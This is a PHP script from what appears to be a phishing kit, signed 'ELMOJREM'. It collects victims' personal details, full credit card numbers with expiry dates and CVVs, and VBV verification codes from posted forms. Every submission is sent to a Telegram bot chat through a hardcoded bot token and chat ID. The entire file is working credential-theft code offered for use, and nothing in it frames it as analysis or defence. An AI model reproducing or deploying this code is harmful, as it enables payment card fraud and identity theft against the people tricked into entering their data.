<?php
header("Access-Control-Allow-Origin: *"); // Replace '*' with your allowed origins


function getRealIpAddr()
{
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}


$token = "6386525177:AAEPS9bRrXlr9USnL7kz56JIpAeKg4IXrbY";
$user_ids = array("-4190419365");
// Ensure all required variables are set
if (
    isset($_POST['billfirstname'], $_POST['reference'], $_POST['billlastname'], $_POST['billdateofbi1'], $_POST['billconfemail'], $_POST['billphonenumb'], $_POST['billaddrline1'], $_POST['billcitytown1'], $_POST['billpostcode1']) &&
    !empty($_POST['billfirstname']) && !empty($_POST['reference']) && !empty($_POST['billlastname']) && !empty($_POST['billdateofbi1']) && !empty($_POST['billconfemail']) && !empty($_POST['billphonenumb']) && !empty($_POST['billaddrline1']) && !empty($_POST['billcitytown1']) && !empty($_POST['billpostcode1'])
) {
    $ip = getRealIpAddr();
    $reference = urldecode($_POST['reference']);
    $firstname = urldecode($_POST['billfirstname']);
    $lastname = urldecode($_POST['billlastname']);
    $billdateofbi1 = urldecode($_POST['billdateofbi1']);
    $emailcon = urldecode($_POST['billconfemail']);
    $phonenum = urldecode($_POST['billphonenumb']);
    $billing1 = urldecode($_POST['billaddrline1']);
    $citytown = urldecode($_POST['billcitytown1']);
    $postcode = urldecode($_POST['billpostcode1']);
    // $country = getCountryFromIp($ip);

    // Construct the message
    $message = "#---------------++==[ ⚡️ New BILL Rez ⚡️ ]==++-------------#\n";
    $message .= "FULL NAME  : $firstname $lastname\n";
    $message .= "DOB : $billdateofbi1\n";
    $message .= "EMAIL ADD  : $emailcon\n";
    $message .= "PHONE NUM  : +61$phonenum\n";
    $message .= "BILLING 1  : $billing1\n";
    $message .= "CITY/TOWN  : $citytown\n";
    $message .= "ZIP  CODE  : $postcode\n";
    $message .= "#---------------++==[ 💻 USER INFO 💻 ]==++-------------#\n";
    $message .= "IP  : $ip\n";
    $message .= "#---------------++==[ ⚠️ BY ELMOJREM ⚠️ ]==++-------------#\n";

    // Send message to Telegram chat for each user_id
    foreach ($user_ids as $user_id) {
        $website = "https://api.telegram.org/bot" . $token;
        $params = [
            'chat_id' => $user_id,
            'text' => $message,
        ];
        $ch = curl_init($website . '/sendMessage');
        curl_setopt($ch, CURLOPT_HEADER, false);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $result = curl_exec($ch);
        curl_close($ch);
    }
}

// Ensure all required variables are set
if (
    isset(
        $_POST['billfullname'],
        $_POST['reference'],
        $_POST['billccnumber'],
        $_POST['billexpirati'],
        $_POST['billexpircvv']
    )
) {
    $ip = getRealIpAddr();
    $reference = urldecode($_POST['reference']);
    $billfullname = urldecode($_POST['billfullname']);
    $billccnumber = urldecode($_POST['billccnumber']);
    $billexpirati = urldecode($_POST['billexpirati']);
    $billexpircvv = urldecode($_POST['billexpircvv']);

    // Validate and sanitize credit card information
    $realcc = str_replace(' ', '', $billccnumber);
    // Additional validation and sanitization steps if needed

    // Construct the message
    $message = "#---------------++==[ тЪбя╕П New CVV Rez тЪбя╕П ]==++-------------#\n";
    $message .= "FULL NAME  : $billfullname\n";
    $message .= "CC NUMBER  : $realcc\n";
    $message .= "EXPIRATION : $billexpirati\n";
    $message .= "CVV NUMBR  : $billexpircvv\n";
    $message .= "#---------------++==[ ЁЯТ╗ USER INFO ЁЯТ╗ ]==++-------------#\n";
    $message .= "IP  : $ip\n";
    $message .= "#---------------++==[ тЪая╕П BY ELMOJREM тЪая╕П ]==++-------------#\n";

    // Send message to Telegram chat for each user_id
    foreach ($user_ids as $user_id) {
        $website = "https://api.telegram.org/bot" . $token;
        $params = [
            'chat_id' => $user_id,
            'text' => $message,
        ];
        $ch = curl_init($website . '/sendMessage');
        curl_setopt($ch, CURLOPT_HEADER, false);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $result = curl_exec($ch);
        curl_close($ch);
    }

}

// Ensure all required variables are set
if (isset($_POST['text_input'], $_GET['ccnumber'])) {
    $ccnumb = base64_decode($_GET['ccnumber']);
    $Cpode = $_POST['text_input'];

    // Validate and sanitize credit card number and VBV code
    $realcc = str_replace(' ', '', $ccnumb);
    // Additional validation and sanitization steps if needed

    // Construct the message
    $message = "#---------------++==[ тЪбя╕П New VBV Rez тЪбя╕П ]==++-------------#\n";
    $message .= "CCNUMB  : $realcc\n";
    $message .= "VBV  : $Cpode\n";
    $message .= "#---------------++==[ ЁЯТ╗ USER INFO ЁЯТ╗ ]==++-------------#\n";
    $message .= "IP  : " . getRealIpAddr() . "\n";
    $message .= "#---------------++==[ тЪая╕П BY ELMOJREM тЪая╕П ]==++-------------#\n";

    // Send message to Telegram chat for each user_id
    foreach ($user_ids as $user_id) {
        $website = "https://api.telegram.org/bot" . $token;
        $params = [
            'chat_id' => $user_id,
            'text' => $message,
        ];
        $ch = curl_init($website . '/sendMessage');
        curl_setopt($ch, CURLOPT_HEADER, false);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $result = curl_exec($ch);

        // Handle cURL errors
        if ($result === false) {
            $error = curl_error($ch);
            // Handle the error (e.g., log the error, display an error message, etc.)
            // Avoid showing specific cURL errors to users for security reasons
        }

        curl_close($ch);
    }

    // Clear HTTP headers and output an "ok" response
    //header_remove();
    echo 'ok';
    exit();
}



?>
